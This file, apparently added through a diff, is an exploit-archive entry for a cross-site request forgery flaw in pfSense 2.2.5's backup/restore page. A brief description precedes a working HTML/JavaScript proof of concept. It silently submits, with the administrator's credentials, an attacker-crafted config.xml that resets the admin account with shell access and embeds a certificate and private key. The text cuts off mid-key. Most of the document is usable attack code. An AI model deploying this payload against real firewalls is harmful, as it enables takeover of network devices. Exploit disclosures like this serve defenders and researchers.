@@ -1,0 +1,375 @@
+<!--
+# Exploit Title: pfSense Firewall 2.2.5 Cross-Site Request Forgery 
+# Date: 23-01-2016
+# Software Link: http://mirror.ancl.hawaii.edu/pub/pfSense/downloads/pfSense-2.2.5-RELEASE-1g-amd64-nanobsd.img.gz
+# Exploit Author: Aatif Shahdad
+# Twitter: https://twitter.com/61617469665f736
+# Contact: aatif_shahdad@icloud.com
+# Category: webapps
+ 
+1. Description
+   
+The page diag_backup.php had CSRF checking disabled for all functions, including the restore function. As a result, a specially crafted attacker page could cause
+a logged-in administrator to upload a config.xml crafted by the attacker.
+   
+2. Proof of Concept
+ 
+Login as admin to the Web Console at http://192.168.0.103 (set at the time on install). Open the following Proof-Of-Concept with the browser that you used to log in to the Firewall.
+
+POC to upload crafted config.xml:
+
+--POC begins--
+
+-->
+
+<html>
+  <body>
+    <script>
+      function submitRequest()
+      {
+        var xhr = new XMLHttpRequest();
+        xhr.open("POST", "https://192.168.0.103/diag_backup.php", true);
+        xhr.setRequestHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
+        xhr.setRequestHeader("Accept-Language", "en-US,en;q=0.5");
+        xhr.setRequestHeader("Content-Type", "multipart/form-data; boundary=---------------------------8271879791886716022292650152");
+        xhr.withCredentials = true;
+        var body = "-----------------------------8271879791886716022292650152\r\n" + 
+          "Content-Disposition: form-data; name=\"backuparea\"\r\n" + 
+          "\r\n" + 
+          "\r\n" + 
+          "-----------------------------8271879791886716022292650152\r\n" + 
+          "Content-Disposition: form-data; name=\"donotbackuprrd\"\r\n" + 
+          "\r\n" + 
+          "on\r\n" + 
+          "-----------------------------8271879791886716022292650152\r\n" + 
+          "Content-Disposition: form-data; name=\"encrypt_password\"\r\n" + 
+          "\r\n" + 
+          "\r\n" + 
+          "-----------------------------8271879791886716022292650152\r\n" + 
+          "Content-Disposition: form-data; name=\"encrypt_passconf\"\r\n" + 
+          "\r\n" + 
+          "\r\n" + 
+          "-----------------------------8271879791886716022292650152\r\n" + 
+          "Content-Disposition: form-data; name=\"restorearea\"\r\n" + 
+          "\r\n" + 
+          "\r\n" + 
+          "-----------------------------8271879791886716022292650152\r\n" + 
+          "Content-Disposition: form-data; name=\"conffile\"; filename=\"config-pfSense.localdomain-20160123123616.xml\"\r\n" + 
+          "Content-Type: text/xml\r\n" + 
+          "\r\n" + 
+          "\x3c?xml version=\"1.0\"?\x3e\n" + 
+          "\x3cpfsense\x3e\n" + 
+          "\t\x3cversion\x3e12.0\x3c/version\x3e\n" + 
+          "\t\x3clastchange/\x3e\n" + 
+          "\t\x3ctheme\x3epfsense_ng\x3c/theme\x3e\n" + 
+          "\t\x3csystem\x3e\n" + 
+          "\t\t\x3coptimization\x3enormal\x3c/optimization\x3e\n" + 
+          "\t\t\x3chostname\x3epfSense\x3c/hostname\x3e\n" + 
+          "\t\t\x3cdomain\x3elocaldomain\x3c/domain\x3e\n" + 
+          "\t\t\x3cgroup\x3e\n" + 
+          "\t\t\t\x3cname\x3eall\x3c/name\x3e\n" + 
+          "\t\t\t\x3cdescription\x3e\x3c![CDATA[All Users]]\x3e\x3c/description\x3e\n" + 
+          "\t\t\t\x3cscope\x3esystem\x3c/scope\x3e\n" + 
+          "\t\t\t\x3cgid\x3e1998\x3c/gid\x3e\n" + 
+          "\t\t\t\x3cmember\x3e0\x3c/member\x3e\n" + 
+          "\t\t\x3c/group\x3e\n" + 
+          "\t\t\x3cgroup\x3e\n" + 
+          "\t\t\t\x3cname\x3eadmins\x3c/name\x3e\n" + 
+          "\t\t\t\x3cdescription\x3e\x3c![CDATA[System Administrators]]\x3e\x3c/description\x3e\n" + 
+          "\t\t\t\x3cscope\x3esystem\x3c/scope\x3e\n" + 
+          "\t\t\t\x3cgid\x3e1999\x3c/gid\x3e\n" + 
+          "\t\t\t\x3cmember\x3e0\x3c/member\x3e\n" + 
+          "\t\t\t\x3cpriv\x3epage-all\x3c/priv\x3e\n" + 
+          "\t\t\x3c/group\x3e\n" + 
+          "\t\t\x3cuser\x3e\n" + 
+          "\t\t\t\x3cname\x3eadmin\x3c/name\x3e\n" + 
+          "\t\t\t\x3cdescr\x3e\x3c![CDATA[System Administrator]]\x3e\x3c/descr\x3e\n" + 
+          "\t\t\t\x3cscope\x3esystem\x3c/scope\x3e\n" + 
+          "\t\t\t\x3cgroupname\x3eadmins\x3c/groupname\x3e\n" + 
+          "\t\t\t\x3cpassword\x3e$1$HuUrmCMQ$HcpUfJ7bi2kDoPmwaW5Hf.\x3c/password\x3e\n" + 
+          "\t\t\t\x3cuid\x3e0\x3c/uid\x3e\n" + 
+          "\t\t\t\x3cpriv\x3euser-shell-access\x3c/priv\x3e\n" + 
+          "\t\t\t\x3cmd5-hash\x3e3a4b4c4dde494d2cec3e0ea68e437e17\x3c/md5-hash\x3e\n" + 
+          "\t\t\t\x3cnt-hash\x3e3338333834323034353935373932633863623430663264336164663532353636\x3c/nt-hash\x3e\n" + 
+          "\t\t\x3c/user\x3e\n" + 
+          "\t\t\x3cnextuid\x3e2000\x3c/nextuid\x3e\n" + 
+          "\t\t\x3cnextgid\x3e2000\x3c/nextgid\x3e\n" + 
+          "\t\t\x3ctimezone\x3eEtc/UTC\x3c/timezone\x3e\n" + 
+          "\t\t\x3ctime-update-interval/\x3e\n" + 
+          "\t\t\x3ctimeservers\x3e0.pfsense.pool.ntp.org\x3c/timeservers\x3e\n" + 
+          "\t\t\x3cwebgui\x3e\n" + 
+          "\t\t\t\x3cprotocol\x3ehttps\x3c/protocol\x3e\n" + 
+          "\t\t\t\x3cloginautocomplete/\x3e\n" + 
+          "\t\t\t\x3cssl-certref\x3e56a352ca3e5fb\x3c/ssl-certref\x3e\n" + 
+          "\t\t\x3c/webgui\x3e\n" + 
+          "\t\t\x3cdisablenatreflection\x3eyes\x3c/disablenatreflection\x3e\n" + 
+          "\t\t\x3cdisablesegmentationoffloading/\x3e\n" + 
+          "\t\t\x3cdisablelargereceiveoffloading/\x3e\n" + 
+          "\t\t\x3cipv6allow/\x3e\n" + 
+          "\t\t\x3cpowerd_ac_mode\x3ehadp\x3c/powerd_ac_mode\x3e\n" + 
+          "\t\t\x3cpowerd_battery_mode\x3ehadp\x3c/powerd_battery_mode\x3e\n" + 
+          "\t\t\x3cpowerd_normal_mode\x3ehadp\x3c/powerd_normal_mode\x3e\n" + 
+          "\t\t\x3cbogons\x3e\n" + 
+          "\t\t\t\x3cinterval\x3emonthly\x3c/interval\x3e\n" + 
+          "\t\t\x3c/bogons\x3e\n" + 
+          "\t\t\x3ckill_states/\x3e\n" + 
+          "\t\t\x3clanguage\x3een_US\x3c/language\x3e\n" + 
+          "\t\t\x3cdns1gw\x3enone\x3c/dns1gw\x3e\n" + 
+          "\t\t\x3cdns2gw\x3enone\x3c/dns2gw\x3e\n" + 
+          "\t\t\x3cdns3gw\x3enone\x3c/dns3gw\x3e\n" + 
+          "\t\t\x3cdns4gw\x3enone\x3c/dns4gw\x3e\n" + 
+          "\t\t\x3cdnsserver\x3e8.8.8.8\x3c/dnsserver\x3e\n" + 
+          "\t\t\x3cdnsserver\x3e8.8.8.8\x3c/dnsserver\x3e\n" + 
+          "\t\t\x3cdnsallowoverride/\x3e\n" + 
+          "\t\x3c/system\x3e\n" + 
+          "\t\x3cinterfaces\x3e\n" + 
+          "\t\t\x3cwan\x3e\n" + 
+          "\t\t\t\x3cenable/\x3e\n" + 
+          "\t\t\t\x3cif\x3eem0\x3c/if\x3e\n" + 
+          "\t\t\t\x3cipaddr\x3edhcp\x3c/ipaddr\x3e\n" + 
+          "\t\t\t\x3cipaddrv6\x3edhcp6\x3c/ipaddrv6\x3e\n" + 
+          "\t\t\t\x3cgateway/\x3e\n" + 
+          "\t\t\t\x3cblockbogons\x3eon\x3c/blockbogons\x3e\n" + 
+          "\t\t\t\x3cmedia/\x3e\n" + 
+          "\t\t\t\x3cmediaopt/\x3e\n" + 
+          "\t\t\t\x3cdhcp6-duid/\x3e\n" + 
+          "\t\t\t\x3cdhcp6-ia-pd-len\x3e0\x3c/dhcp6-ia-pd-len\x3e\n" + 
+          "\t\t\x3c/wan\x3e\n" + 
+          "\t\x3c/interfaces\x3e\n" + 
+          "\t\x3cstaticroutes/\x3e\n" + 
+          "\t\x3cdhcpd/\x3e\n" + 
+          "\t\x3cpptpd\x3e\n" + 
+          "\t\t\x3cmode/\x3e\n" + 
+          "\t\t\x3credir/\x3e\n" + 
+          "\t\t\x3clocalip/\x3e\n" + 
+          "\t\t\x3cremoteip/\x3e\n" + 
+          "\t\x3c/pptpd\x3e\n" + 
+          "\t\x3csnmpd\x3e\n" + 
+          "\t\t\x3csyslocation/\x3e\n" + 
+          "\t\t\x3csyscontact/\x3e\n" + 
+          "\t\t\x3crocommunity\x3epublic\x3c/rocommunity\x3e\n" + 
+          "\t\x3c/snmpd\x3e\n" + 
+          "\t\x3cdiag\x3e\n" + 
+          "\t\t\x3cipv6nat\x3e\n" + 
+          "\t\t\t\x3cipaddr/\x3e\n" + 
+          "\t\t\x3c/ipv6nat\x3e\n" + 
+          "\t\x3c/diag\x3e\n" + 
+          "\t\x3cbridge/\x3e\n" + 
+          "\t\x3csyslog/\x3e\n" + 
+          "\t\x3cfilter\x3e\n" + 
+          "\t\t\x3crule\x3e\n" + 
+          "\t\t\t\x3ctype\x3epass\x3c/type\x3e\n" + 
+          "\t\t\t\x3cipprotocol\x3einet\x3c/ipprotocol\x3e\n" + 
+          "\t\t\t\x3cdescr\x3e\x3c![CDATA[Default allow LAN to any rule]]\x3e\x3c/descr\x3e\n" + 
+          "\t\t\t\x3cinterface\x3elan\x3c/interface\x3e\n" + 
+          "\t\t\t\x3ctracker\x3e0100000101\x3c/tracker\x3e\n" + 
+          "\t\t\t\x3csource\x3e\n" + 
+          "\t\t\t\t\x3cnetwork\x3elan\x3c/network\x3e\n" + 
+          "\t\t\t\x3c/source\x3e\n" + 
+          "\t\t\t\x3cdestination\x3e\n" + 
+          "\t\t\t\t\x3cany/\x3e\n" + 
+          "\t\t\t\x3c/destination\x3e\n" + 
+          "\t\t\x3c/rule\x3e\n" + 
+          "\t\t\x3crule\x3e\n" + 
+          "\t\t\t\x3ctype\x3epass\x3c/type\x3e\n" + 
+          "\t\t\t\x3cipprotocol\x3einet6\x3c/ipprotocol\x3e\n" + 
+          "\t\t\t\x3cdescr\x3e\x3c![CDATA[Default allow LAN IPv6 to any rule]]\x3e\x3c/descr\x3e\n" + 
+          "\t\t\t\x3cinterface\x3elan\x3c/interface\x3e\n" + 
+          "\t\t\t\x3ctracker\x3e0100000102\x3c/tracker\x3e\n" + 
+          "\t\t\t\x3csource\x3e\n" + 
+          "\t\t\t\t\x3cnetwork\x3elan\x3c/network\x3e\n" + 
+          "\t\t\t\x3c/source\x3e\n" + 
+          "\t\t\t\x3cdestination\x3e\n" + 
+          "\t\t\t\t\x3cany/\x3e\n" + 
+          "\t\t\t\x3c/destination\x3e\n" + 
+          "\t\t\x3c/rule\x3e\n" + 
+          "\t\x3c/filter\x3e\n" + 
+          "\t\x3cipsec/\x3e\n" + 
+          "\t\x3caliases/\x3e\n" + 
+          "\t\x3cproxyarp/\x3e\n" + 
+          "\t\x3ccron\x3e\n" + 
+          "\t\t\x3citem\x3e\n" + 
+          "\t\t\t\x3cminute\x3e1,31\x3c/minute\x3e\n" + 
+          "\t\t\t\x3chour\x3e0-5\x3c/hour\x3e\n" + 
+          "\t\t\t\x3cmday\x3e*\x3c/mday\x3e\n" + 
+          "\t\t\t\x3cmonth\x3e*\x3c/month\x3e\n" + 
+          "\t\t\t\x3cwday\x3e*\x3c/wday\x3e\n" + 
+          "\t\t\t\x3cwho\x3eroot\x3c/who\x3e\n" + 
+          "\t\t\t\x3ccommand\x3e/usr/bin/nice -n20 adjkerntz -a\x3c/command\x3e\n" + 
+          "\t\t\x3c/item\x3e\n" + 
+          "\t\t\x3citem\x3e\n" + 
+          "\t\t\t\x3cminute\x3e1\x3c/minute\x3e\n" + 
+          "\t\t\t\x3chour\x3e3\x3c/hour\x3e\n" + 
+          "\t\t\t\x3cmday\x3e1\x3c/mday\x3e\n" + 
+          "\t\t\t\x3cmonth\x3e*\x3c/month\x3e\n" + 
+          "\t\t\t\x3cwday\x3e*\x3c/wday\x3e\n" + 
+          "\t\t\t\x3cwho\x3eroot\x3c/who\x3e\n" + 
+          "\t\t\t\x3ccommand\x3e/usr/bin/nice -n20 /etc/rc.update_bogons.sh\x3c/command\x3e\n" + 
+          "\t\t\x3c/item\x3e\n" + 
+          "\t\t\x3citem\x3e\n" + 
+          "\t\t\t\x3cminute\x3e*/60\x3c/minute\x3e\n" + 
+          "\t\t\t\x3chour\x3e*\x3c/hour\x3e\n" + 
+          "\t\t\t\x3cmday\x3e*\x3c/mday\x3e\n" + 
+          "\t\t\t\x3cmonth\x3e*\x3c/month\x3e\n" + 
+          "\t\t\t\x3cwday\x3e*\x3c/wday\x3e\n" + 
+          "\t\t\t\x3cwho\x3eroot\x3c/who\x3e\n" + 
+          "\t\t\t\x3ccommand\x3e/usr/bin/nice -n20 /usr/local/sbin/expiretable -v -t 3600 sshlockout\x3c/command\x3e\n" + 
+          "\t\t\x3c/item\x3e\n" + 
+          "\t\t\x3citem\x3e\n" + 
+          "\t\t\t\x3cminute\x3e*/60\x3c/minute\x3e\n" + 
+          "\t\t\t\x3chour\x3e*\x3c/hour\x3e\n" + 
+          "\t\t\t\x3cmday\x3e*\x3c/mday\x3e\n" + 
+          "\t\t\t\x3cmonth\x3e*\x3c/month\x3e\n" + 
+          "\t\t\t\x3cwday\x3e*\x3c/wday\x3e\n" + 
+          "\t\t\t\x3cwho\x3eroot\x3c/who\x3e\n" + 
+          "\t\t\t\x3ccommand\x3e/usr/bin/nice -n20 /usr/local/sbin/expiretable -v -t 3600 webConfiguratorlockout\x3c/command\x3e\n" + 
+          "\t\t\x3c/item\x3e\n" + 
+          "\t\t\x3citem\x3e\n" + 
+          "\t\t\t\x3cminute\x3e1\x3c/minute\x3e\n" + 
+          "\t\t\t\x3chour\x3e1\x3c/hour\x3e\n" + 
+          "\t\t\t\x3cmday\x3e*\x3c/mday\x3e\n" + 
+          "\t\t\t\x3cmonth\x3e*\x3c/month\x3e\n" + 
+          "\t\t\t\x3cwday\x3e*\x3c/wday\x3e\n" + 
+          "\t\t\t\x3cwho\x3eroot\x3c/who\x3e\n" + 
+          "\t\t\t\x3ccommand\x3e/usr/bin/nice -n20 /etc/rc.dyndns.update\x3c/command\x3e\n" + 
+          "\t\t\x3c/item\x3e\n" + 
+          "\t\t\x3citem\x3e\n" + 
+          "\t\t\t\x3cminute\x3e*/60\x3c/minute\x3e\n" + 
+          "\t\t\t\x3chour\x3e*\x3c/hour\x3e\n" + 
+          "\t\t\t\x3cmday\x3e*\x3c/mday\x3e\n" + 
+          "\t\t\t\x3cmonth\x3e*\x3c/month\x3e\n" + 
+          "\t\t\t\x3cwday\x3e*\x3c/wday\x3e\n" + 
+          "\t\t\t\x3cwho\x3eroot\x3c/who\x3e\n" + 
+          "\t\t\t\x3ccommand\x3e/usr/bin/nice -n20 /usr/local/sbin/expiretable -v -t 3600 virusprot\x3c/command\x3e\n" + 
+          "\t\t\x3c/item\x3e\n" + 
+          "\t\t\x3citem\x3e\n" + 
+          "\t\t\t\x3cminute\x3e30\x3c/minute\x3e\n" + 
+          "\t\t\t\x3chour\x3e12\x3c/hour\x3e\n" + 
+          "\t\t\t\x3cmday\x3e*\x3c/mday\x3e\n" + 
+          "\t\t\t\x3cmonth\x3e*\x3c/month\x3e\n" + 
+          "\t\t\t\x3cwday\x3e*\x3c/wday\x3e\n" + 
+          "\t\t\t\x3cwho\x3eroot\x3c/who\x3e\n" + 
+          "\t\t\t\x3ccommand\x3e/usr/bin/nice -n20 /etc/rc.update_urltables\x3c/command\x3e\n" + 
+          "\t\t\x3c/item\x3e\n" + 
+          "\t\x3c/cron\x3e\n" + 
+          "\t\x3cwol/\x3e\n" + 
+          "\t\x3crrd\x3e\n" + 
+          "\t\t\x3cenable/\x3e\n" + 
+          "\t\x3c/rrd\x3e\n" + 
+          "\t\x3cload_balancer\x3e\n" + 
+          "\t\t\x3cmonitor_type\x3e\n" + 
+          "\t\t\t\x3cname\x3eICMP\x3c/name\x3e\n" + 
+          "\t\t\t\x3ctype\x3eicmp\x3c/type\x3e\n" + 
+          "\t\t\t\x3cdescr\x3e\x3c![CDATA[ICMP]]\x3e\x3c/descr\x3e\n" + 
+          "\t\t\t\x3coptions/\x3e\n" + 
+          "\t\t\x3c/monitor_type\x3e\n" + 
+          "\t\t\x3cmonitor_type\x3e\n" + 
+          "\t\t\t\x3cname\x3eTCP\x3c/name\x3e\n" + 
+          "\t\t\t\x3ctype\x3etcp\x3c/type\x3e\n" + 
+          "\t\t\t\x3cdescr\x3e\x3c![CDATA[Generic TCP]]\x3e\x3c/descr\x3e\n" + 
+          "\t\t\t\x3coptions/\x3e\n" + 
+          "\t\t\x3c/monitor_type\x3e\n" + 
+          "\t\t\x3cmonitor_type\x3e\n" + 
+          "\t\t\t\x3cname\x3eHTTP\x3c/name\x3e\n" + 
+          "\t\t\t\x3ctype\x3ehttp\x3c/type\x3e\n" + 
+          "\t\t\t\x3cdescr\x3e\x3c![CDATA[Generic HTTP]]\x3e\x3c/descr\x3e\n" + 
+          "\t\t\t\x3coptions\x3e\n" + 
+          "\t\t\t\t\x3cpath\x3e/\x3c/path\x3e\n" + 
+          "\t\t\t\t\x3chost/\x3e\n" + 
+          "\t\t\t\t\x3ccode\x3e200\x3c/code\x3e\n" + 
+          "\t\t\t\x3c/options\x3e\n" + 
+          "\t\t\x3c/monitor_type\x3e\n" + 
+          "\t\t\x3cmonitor_type\x3e\n" + 
+          "\t\t\t\x3cname\x3eHTTPS\x3c/name\x3e\n" + 
+          "\t\t\t\x3ctype\x3ehttps\x3c/type\x3e\n" + 
+          "\t\t\t\x3cdescr\x3e\x3c![CDATA[Generic HTTPS]]\x3e\x3c/descr\x3e\n" + 
+          "\t\t\t\x3coptions\x3e\n" + 
+          "\t\t\t\t\x3cpath\x3e/\x3c/path\x3e\n" + 
+          "\t\t\t\t\x3chost/\x3e\n" + 
+          "\t\t\t\t\x3ccode\x3e200\x3c/code\x3e\n" + 
+          "\t\t\t\x3c/options\x3e\n" + 
+          "\t\t\x3c/monitor_type\x3e\n" + 
+          "\t\t\x3cmonitor_type\x3e\n" + 
+          "\t\t\t\x3cname\x3eSMTP\x3c/name\x3e\n" + 
+          "\t\t\t\x3ctype\x3esend\x3c/type\x3e\n" + 
+          "\t\t\t\x3cdescr\x3e\x3c![CDATA[Generic SMTP]]\x3e\x3c/descr\x3e\n" + 
+          "\t\t\t\x3coptions\x3e\n" + 
+          "\t\t\t\t\x3csend/\x3e\n" + 
+          "\t\t\t\t\x3cexpect\x3e220 *\x3c/expect\x3e\n" + 
+          "\t\t\t\x3c/options\x3e\n" + 
+          "\t\t\x3c/monitor_type\x3e\n" + 
+          "\t\x3c/load_balancer\x3e\n" + 
+          "\t\x3cwidgets\x3e\n" + 
+          "\t\t\x3csequence\x3esystem_information-container:col1:show,captive_portal_status-container:col1:close,carp_status-container:col1:close,cpu_graphs-container:col1:close,gateways-container:col1:close,gmirror_status-container:col1:close,installed_packages-container:col1:close,interface_statistics-container:col1:close,interfaces-container:col2:show,ipsec-container:col2:close,load_balancer_status-container:col2:close,log-container:col2:close,picture-container:col2:close,rss-container:col2:close,services_status-container:col2:close,traffic_graphs-container:col2:close\x3c/sequence\x3e\n" + 
+          "\t\x3c/widgets\x3e\n" + 
+          "\t\x3copenvpn/\x3e\n" + 
+          "\t\x3cdnshaper/\x3e\n" + 
+          "\t\x3cunbound\x3e\n" + 
+          "\t\t\x3cenable/\x3e\n" + 
+          "\t\t\x3cdnssec/\x3e\n" + 
+          "\t\t\x3cactive_interface/\x3e\n" + 
+          "\t\t\x3coutgoing_interface/\x3e\n" + 
+          "\t\t\x3ccustom_options/\x3e\n" + 
+          "\t\t\x3chideidentity/\x3e\n" + 
+          "\t\t\x3chideversion/\x3e\n" + 
+          "\t\t\x3cdnssecstripped/\x3e\n" + 
+          "\t\x3c/unbound\x3e\n" + 
+          "\t\x3cvlans/\x3e\n" + 
+          "\t\x3crevision\x3e\n" + 
+          "\t\t\x3ctime\x3e1453547589\x3c/time\x3e\n" + 
+          "\t\t\x3cdescription\x3e\x3c![CDATA[admin@192.168.0.101: System: ]]\x3e\x3c/description\x3e\n" + 
+          "\t\t\x3cusername\x3eadmin@192.168.0.101\x3c/username\x3e\n" + 
+          "\t\x3c/revision\x3e\n" + 
+          "\t\x3cshaper/\x3e\n" + 
+          "\t\x3ccert\x3e\n" + 
+          "\t\t\x3crefid\x3e56a352ca3e5fb\x3c/refid\x3e\n" + 
+          "\t\t\x3cdescr\x3e\x3c![CDATA[webConfigurator default (56a352ca3e5fb)]]\x3e\x3c/descr\x3e\n" + 
+          "\t\t\x3ctype\x3eserver\x3c/type\x3e\n" + 
+          "\t\t\x3ccrt\x3eLS0tLS1CRUdJTiBDRVJUSUZJQ0FURS0tLS0tCk1JSUZiVENDQkZXZ0F3SUJBZ0lCQURBTkJna3Foa2lHOXcwQkFRc0ZBRENCdERFTE1Ba0dBMVVFQmhNQ1ZWTXgKRGpBTUJnTlZCQWdUQlZOMFlYUmxNUkV3RHdZRFZRUUhFd2hNYjJOaGJHbDBlVEU0TURZR0ExVUVDaE12Y0daVApaVzV6WlNCM1pXSkRiMjVtYVdkMWNtRjBiM0lnVTJWc1ppMVRhV2R1WldRZ1EyVnlkR2xtYVdOaGRHVXhLREFtCkJna3Foa2lHOXcwQkNRRVdHV0ZrYldsdVFIQm1VMlZ1YzJVdWJHOWpZV3hrYjIxaGFXNHhIakFjQmdOVkJBTVQKRlhCbVUyVnVjMlV0TlRaaE16VXlZMkV6WlRWbVlqQWVGdzB4TmpBeE1qTXhNREUxTXpoYUZ3MHlNVEEzTVRVeApNREUxTXpoYU1JRzBNUXN3Q1FZRFZRUUdFd0pWVXpFT01Bd0dBMVVFQ0JNRlUzUmhkR1V4RVRBUEJnTlZCQWNUCkNFeHZZMkZzYVhSNU1UZ3dOZ1lEVlFRS0V5OXdabE5sYm5ObElIZGxZa052Ym1acFozVnlZWFJ2Y2lCVFpXeG0KTFZOcFoyNWxaQ0JEWlhKMGFXWnBZMkYwWlRFb01DWUdDU3FHU0liM0RRRUpBUllaWVdSdGFXNUFjR1pUWlc1egpaUzVzYjJOaGJHUnZiV0ZwYmpFZU1Cd0dBMVVFQXhNVmNHWlRaVzV6WlMwMU5tRXpOVEpqWVRObE5XWmlNSUlCCklqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FROEFNSUlCQ2dLQ0FRRUE1OEwyN3dFMnc5NGtONWpPdS9UMFVHYTYKcjBGUlptM2ZDdmdRdElpUHZVUEN4SHpkQ3RyalRCaUdZK3grU0t4cFpEREJvdGg4cmQzS1dSdWRIajR6cFpnSwpKOXR5djJhVXNTQ3Jqd3NCc3Fva0RzdHNaUlR2RkRPTE9kd2xKNDBxV2grVjNINStiOWNKM09SN1d2Zkc4MHdGClJQbjdCMTFlMHdJVU1OSkhjbWtpbHRva0lVSlJRbWtSSTU1K3dnQkdrWUlwTTJCOTdQc0tWSVdjUnVQSnhRcFQKY0l4VmFvNmtIVDFBQytsU2RxK0x6UWlrSTJBRkU3a1RjeDVFK28yZnRWRlZySHI2b1hhdlYzRCtoZmRwaFp0VgpTQllXYUZycDZlVUJwYm5zQlR0c2orUlp1S1RmWEczSTJQTWFWOVAyNkJ2VU5xVXhtdkJsc3BZRTRJaVFld0lECkFRQUJvNElCaGpDQ0FZSXdDUVlEVlIwVEJBSXdBREFSQmdsZ2hrZ0JodmhDQVFFRUJBTUNCa0F3TXdZSllJWkkKQVliNFFnRU5CQ1lXSkU5d1pXNVRVMHdnUjJWdVpYSmhkR1ZrSUZObGNuWmxjaUJEWlhKMGFXWnBZMkYwWlRBZApCZ05WSFE0RUZnUVVCUmNZeGlxaEkreE1FWjEwcnlFVS9NWWZLeUV3Z2VFR0ExVWRJd1NCMlRDQjFvQVVCUmNZCnhpcWhJK3hNRVoxMHJ5RVUvTVlmS3lHaGdicWtnYmN3Z2JReEN6QUpCZ05WQkFZVEFsVlRNUTR3REFZRFZRUUkKRXdWVGRHRjBaVEVSTUE4R0ExVUVCeE1JVEc5allXeHBkSGt4T0RBMkJnTlZCQW9UTDNCbVUyVnVjMlVnZDJWaQpRMjl1Wm1sbmRYSmhkRzl5SUZObGJHWXRVMmxuYm1Wa0lFTmxjblJwWm1sallYUmxNU2d3SmdZSktvWklodmNOCkFRa0JGaGxoWkcxcGJrQndabE5sYm5ObExteHZZMkZzWkc5dFlXbHVNUjR3SEFZRFZRUURFeFZ3WmxObGJuTmwKTFRVMllUTTFNbU5oTTJVMVptS0NBUUF3SFFZRFZSMGxCQll3RkFZSUt3WUJCUVVIQXdFR0NDc0dBUVVGQ0FJQwpNQXNHQTFVZER3UUVBd0lGb0RBTkJna3Foa2lHOXcwQkFRc0ZBQU9DQVFFQXREcklKREwxYmpiR1IwVS8wTjRICkpPRi9NT1BWSFNLZVp0V2k1eWFFOTR0VlRxbmNYVWNpalRncS8xNHB0NGRzbkl6ek56dFh2aE5wdEl0ZzlTeDIKcnNaRGJEYzNGaXZveUxtU1RQY0E3WGh4MlBJRUdFYzhKRi9CK1I1UDVhRGtGTFRBNE5KMUc1ZXo5UkxERmd3Ngp5TnlUNlJoRkZONXhreXpZY3BHSFZZZTZUQXh1WGdNOVRWdXhENXI5RWJROG53eGE5TnBmSFl0RmhydFN0N3pvCmsvaC9vQnpHeS9JZEh3Y1RHQStkYm9mOUdiNnhkSWFvTGdhc1I5SVovTmFQQUliVFVKTmpMZHhhRXNkbTdsMlcKMUc3NjY2bGphSnB5R1BQRmFtODNrZVZvZzBicmJOMFpwYStMRm0vSW54SVgvT3VDT0M3WmNtS0lPT1p6cTRHdQpiZz09Ci0tLS0tRU5EIENFUlRJRklDQVRFLS0tLS0K\x3c/crt\x3e\n" + 
+          "\t\t\x3cprv\x3eLS0tLS1CRUdJTiBQUklWQVRFIEtFWS0tLS0tCk1JSUV2d0lCQURBTkJna3Foa2lHOXcwQkFRRUZBQVNDQktrd2dnU2xBZ0VBQW9JQkFRRG53dmJ2QVRiRDNpUTMKbU02NzlQUlFacnF2UVZGbWJkOEsrQkMwaUkrOVE4TEVmTjBLMnVOTUdJWmo3SDVJckdsa01NR2kySHl0M2NwWgpHNTBlUGpPbG1Bb24yM0svWnBTeElLdVBDd0d5cWlRT3kyeGxGTzhVTTRzNTNDVW5qU3BhSDVYY2ZuNXYxd25jCjVIdGE5OGJ6VEFWRStmc0hYVjdUQWhRdzBrZHlhU0tXMmlRaFFsRkNhUkVqbm43Q0FFYVJnaWt6WUgzcyt3cFUKaFp4RzQ4bkZDbE53akZWcWpxUWRQVUFMNlZKMnI0dk5DS1FqWUFVVHVSTnpIa1Q2alorMVVWV3NldnFoZHE5WApjUDZGOTJtRm0xVklGaFpvV3VucDVRR2x1ZXdGTzJ5UDVGbTRwTjljYmNqWTh4cFgwL2JvRzlRMnBUR2E4R1d5CmxnVGdpSkI3QWdNQkFBRUNnZ0VCQUs2ZjlEYzVqdTRlSHVQVk8wL2J6WW9YSFdxWHFLR28vM25nVjVYdm4zNVgKNUJUd2tBeHh5UG01TU9seGMrV0dJeExldWNmZG5uUFN2WGhPbWlBRGRoNjdaRXVMeWZYMWNPdlZWZTY5dUZYSwpaTWpROWFka0VwQUNGbEZPVXFCdWVRN1c1YS94ajRydFYvMGNHdVg3OCtlMXkvS2crRWdnVGlablZwZENtWnJWCnRhTXhkcmRIemR0NjlGaU1MWU1kaE9iMUN0azEvRFp4dzhETDB6RXBseWpQNEE5MDA2VWJtT2Y3WXlRQUpkeEcKVGlwNzY5RkdML2x6MU1SVmNmb2drUVRzU0w5OHpuSUNqTXRXeWozL2FrYkxtRCtGeHRaU2UzNHl4c2xoc0I5bApocFJ0alBIUWQ5cmtYYWR4WW51SzJ0U0pxQTgxREhYNFhyQWVmb0RrbjhFQ2dZRUE5MFlIaTJtR2dTRm5mdVFGCnpzRkNXU0ZZbWhrSnZLbVFKQ3NXWW5NN2JoNVdPVnBaM2d3RXh1MFNpdE5aWDBVaWRkR1U5NUhCdUtDWnNvRHEKQnlwQTRuUXdUdkVtWGdpNEh4cGd4bUJDSGkvRGt6eDhpVkkwd3BKNXJzWjBpNXlIcHZtYVVRT0t4WG9FOVpnUApXR1FVSDNUTXViOElsN2RWS2JISjN3T2tJUk1DZ1lFQTcvRExLYXFkWFc5OTlCd00zZlhHNkJYaUxDSXhwaGh3Cm9jSHF0ekxMcS9Ra0dVSzhaTWRlWTNhYi85dHFMWkVBMlVLQjJLdW5ZQUcyVUJZQmNiaVFNNTFCNHREemgvZ20KbTUwSmVMZjZ1SWFRdlAxeVV6QWE1NXpiTEx4WTRlZ2s1MFpZeXErWmF5TEd3dm5PeUVyN3pSWEM0REQrK3RjZQpTaW4rKzFXTHAva0NnWUVBaHFRT0ZaNDNDL2NKYUxGMmJCY1ZMbjBXeG9tZG9LbmZmNklxaFI3am5GbE9iOW8vCmxzV0trRnFrUHcxSDI3VkVSMDBBUlRHTGZ5R0xyd084Nm52YWFyUURYZWkzRUhyRTdzS3BNVHRXcFNNeTVlZ0kKazZrOGF6bmdvZ2NUakxXRnM2aXpteXRIazdHV0k3aFJtcnFicm1rbDFIb3RqcGJYKzJVQVc3dWEwaHNDZ1lCLwpsSHFDUWkwQWhJcmxaSkRXNkp1RnhqVUhvSHJqeFRVR1haVFBLbHd2cDFZV2RHeTE3V2hiM0xKZ0hpdmI1TEVkCjFJWTBUamxtRENNRGZGL3